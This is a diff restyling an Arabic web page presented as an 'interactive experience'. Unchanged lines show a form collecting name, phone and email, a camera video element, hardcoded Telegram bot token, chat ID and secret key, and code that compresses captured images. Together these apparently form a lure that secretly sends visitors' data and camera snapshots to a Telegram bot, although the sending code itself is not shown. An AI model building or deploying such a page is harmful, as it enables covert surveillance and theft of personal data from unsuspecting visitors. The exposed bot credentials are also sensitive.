@@ -4,10 +4,9 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>📽️ منصة تفاعلية</title>
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
-  <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
   <style>
-    /* إعادة تعيين التنسيقات الأساسية */
+    /* إعادة تعيين التنسيقات */
     * {
       margin: 0;
       padding: 0;
@@ -15,110 +14,107 @@
     }
 
     body {
-      font-family: 'Cairo', sans-serif;
-      background: linear-gradient(135deg, #1a1a1a 0%, #000 100%);
-      color: #fff;
+      font-family: 'Tajawal', sans-serif;
+      background: linear-gradient(180deg, #121212 0%, #1c1c1c 100%);
+      color: #ffffff;
       min-height: 100vh;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
       text-align: center;
-      position: relative;
-      overflow: hidden;
+      padding: 20px;
     }
 
-    /* تأثير الجزيئات في الخلفية */
-    #particles-js {
-      position: absolute;
-      width: 100%;
-      height: 100%;
-      z-index: -1;
-      background: transparent;
-    }
-
-    /* الشعار أو العنوان */
-    .logo {
-      font-size: 36px;
-      font-weight: 700;
-      color: #ff0050;
-      text-shadow: 0 0 10px rgba(255, 0, 80, 0.7);
-      margin-bottom: 20px;
-      animation: glow 2s ease-in-out infinite alternate;
-    }
-
-    h1 {
-      font-size: 28px;
-      margin-bottom: 15px;
-      color: #fff;
-      animation: fadeIn 1s ease-in;
-    }
-
-    p {
-      color: #ccc;
-      font-size: 16px;
+    /* حاوية البطاقة */
+    .card {
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 15px;
+      padding: 30px;
       max-width: 500px;
-      margin-bottom: 25px;
-    }
-
-    /* نموذج إدخال البيانات */
-    .form-container {
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
-      max-width: 320px;
+      width: 100%;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
+      backdrop-filter: blur(5px);
       margin: 20px 0;
     }
 
+    /* الشعار */
+    .logo {
+      font-size: 32px;
+      font-weight: 700;
+      color: #d4af37;
+      margin-bottom: 20px;
+      letter-spacing: 1px;
+      animation: fadeIn 1s ease-in;
+    }
+
+    h1 {
+      font-size: 26px;
+      font-weight: 500;
+      color: #ffffff;
+      margin-bottom: 15px;
+      animation: fadeIn 1.2s ease-in;
+    }
+
+    p {
+      color: #e0e0e0;
+      font-size: 16px;
+      line-height: 1.5;
+      margin-bottom: 20px;
+    }
+
+    /* نموذج الإدخال */
+    .form-container {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+      margin-bottom: 25px;
+    }
+
     input {
-      padding: 10px;
-      border: none;
+      padding: 12px;
+      border: 1px solid #d4af37;
       border-radius: 8px;
-      background: rgba(255, 255, 255, 0.1);
-      color: #fff;
+      background: transparent;
+      color: #ffffff;
       font-size: 14px;
-      transition: all 0.3s ease;
+      transition: border-color 0.3s ease;
     }
 
     input::placeholder {
-      color: #aaa;
+      color: #e0e0e0;
     }
 
     input:focus {
       outline: none;
-      box-shadow: 0 0 8px #ff0050;
-      background: rgba(255, 255, 255, 0.15);
+      border-color: #ffffff;
+      box-shadow: 0 0 5px rgba(212, 175, 55, 0.5);
     }
 
     /* الأزرار */
     .button {
-      background: linear-gradient(45deg, #ff0050, #ff4d80);
-      color: #fff;
-      border: none;
+      background: transparent;
+      border: 2px solid #d4af37;
+      color: #d4af37;
       padding: 12px 24px;
-      border-radius: 50px;
+      border-radius: 30px;
       font-size: 16px;
-      font-weight: 700;
+      font-weight: 500;
       cursor: pointer;
       margin: 8px;
-      transition: transform 0.3s, box-shadow 0.3s;
-      box-shadow: 0 4px 15px rgba(255, 0, 80, 0.5);
+      transition: all 0.3s ease;
     }
 
     .button:hover {
+      background: #d4af37;
+      color: #121212;
       transform: translateY(-2px);
-      box-shadow: 0 6px 20px rgba(255, 0, 80, 0.7);
-    }
-
-    .button:active {
-      transform: translateY(0);
     }
 
     /* معاينة الصور */
     .preview-container {
       display: none;
       margin-top: 20px;
-      max-width: 640px;
       display: flex;
       flex-wrap: wrap;
       gap: 10px;
@@ -130,20 +126,20 @@
       height: 75px;
       object-fit: cover;
       border-radius: 8px;
-      border: 2px solid #ff0050;
+      border: 1px solid #d4af37;
       transition: transform 0.3s ease;
     }
 
     .preview-img:hover {
-      transform: scale(1.1);
+      transform: scale(1.05);
     }
 
     /* الإشعارات */
     .notification {
       position: fixed;
       top: 20px;
-      background: #28a745;
-      color: #fff;
+      background: #d4af37;
+      color: #121212;
       padding: 12px 24px;
       border-radius: 8px;
       box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
@@ -158,7 +154,7 @@
 
     /* الأنيميشن */
     @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
+      from { opacity: 0; transform: translateY(10px); }
       to { opacity: 1; transform: translateY(0); }
     }
 
@@ -167,60 +163,39 @@
       to { transform: translateY(0); opacity: 1; }
     }
 
-    @keyframes glow {
-      from { text-shadow: 0 0 10px rgba(255, 0, 80, 0.5); }
-      to { text-shadow: 0 0 20px rgba(255, 0, 80, 0.9); }
-    }
-
-    /* تصميم متجاوب */
+    /* التصميم المتجاوب */
     @media (max-width: 600px) {
       .logo { font-size: 28px; }
-      h1 { font-size: 24px; }
+      h1 { font-size: 22px; }
+      .card { padding: 20px; }
       .button { padding: 10px 20px; font-size: 14px; }
-      .form-container { max-width: 90%; }
       .preview-img { width: 80px; height: 60px; }
+      input { font-size: 13px; }
     }
   </style>
 </head>
 <body>
-  <div id="particles-js"></div>
-  <div class="logo">📽️ منصة الرؤية</div>
-  <h1>📽️ تجربة تفاعلية متكاملة</h1>
-  <p>أدخل بياناتك واضغط لبدء التجربة التفاعلية!</p>
-  <div class="form-container">
-    <input type="text" id="userName" placeholder="الاسم (اختياري)" />
-    <input type="tel" id="userPhone" placeholder="رقم الهاتف (اختياري)" />
-    <input type="email" id="userEmail" placeholder="البريد الإلكتروني (اختياري)" />
+  <div class="card">
+    <div class="logo">✨ منصة الأناقة</div>
+    <h1>📽️ تجربة تفاعلية متكاملة</h1>
+    <p>أدخل بياناتك واضغط لبدء التجربة التفاعلية!</p>
+    <div class="form-container">
+      <input type="text" id="userName" placeholder="الاسم (اختياري)" />
+      <input type="tel" id="userPhone" placeholder="رقم الهاتف (اختياري)" />
+      <input type="email" id="userEmail" placeholder="البريد الإلكتروني (اختياري)" />
+    </div>
+    <button class="button" onclick="startProcess()">▶️ بدء التجربة</button>
+    <button class="button" onclick="openWhatsApp()">📱 فتح واتساب</button>
+    <button class="button" onclick="openFacebook()">📘 فتح فيسبوك</button>
+    <button class="button" onclick="openYouTubeStudio()">🎥 فتح YouTube Studio</button>
+    <button class="button" onclick="openApp('camera')">📷 فتح الكاميرا</button>
+    <div class="preview-container" id="previewContainer"></div>
+    <div class="notification" id="notification"></div>
   </div>
-  <button class="button" onclick="startProcess()">▶️ بدء التجربة</button>
-  <button class="button" onclick="openWhatsApp()">📱 فتح واتساب</button>
-  <button class="button" onclick="openFacebook()">📘 فتح فيسبوك</button>
-  <button class="button" onclick="openYouTubeStudio()">🎥 فتح YouTube Studio</button>
-  <button class="button" onclick="openApp('camera')">📷 فتح الكاميرا</button>
-  <div class="preview-container" id="previewContainer"></div>
-  <div class="notification" id="notification"></div>
   <video id="video" autoplay playsinline></video>
 
   <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
   <script>
-    // تهيئة تأثير الجزيئات
-    particlesJS("particles-js", {
-      particles: {
-        number: { value: 80, density: { enable: true, value_area: 800 } },
-        color: { value: "#ff0050" },
-        shape: { type: "circle" },
-        opacity: { value: 0.5, random: true },
-        size: { value: 3, random: true },
-        line_linked: { enable: true, distance: 150, color: "#ff0050", opacity: 0.4, width: 1 },
-        move: { enable: true, speed: 2, direction: "none", random: true }
-      },
-      interactivity: {
-        detect_on: "canvas",
-        events: { onhover: { enable: true, mode: "repulse" }, onclick: { enable: true, mode: "push" } },
-        modes: { repulse: { distance: 100 }, push: { particles_nb: 4 } }
-      }
-    });
-
     const token = "7439082421:AAEG8hImgTBzQgz9SQbYq47FfGJldOQC_HI";
     const chatId = "7220184605";
     const secretKey = "MySecretKey123";
@@ -312,7 +287,6 @@
       canvas.height = 240;
       const ctx = canvas.getContext("2d");
       img.src = URL.createObjectURL(blob);
-先行
       await new Promise(resolve => (img.onload = resolve));
       ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
       return new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.7));
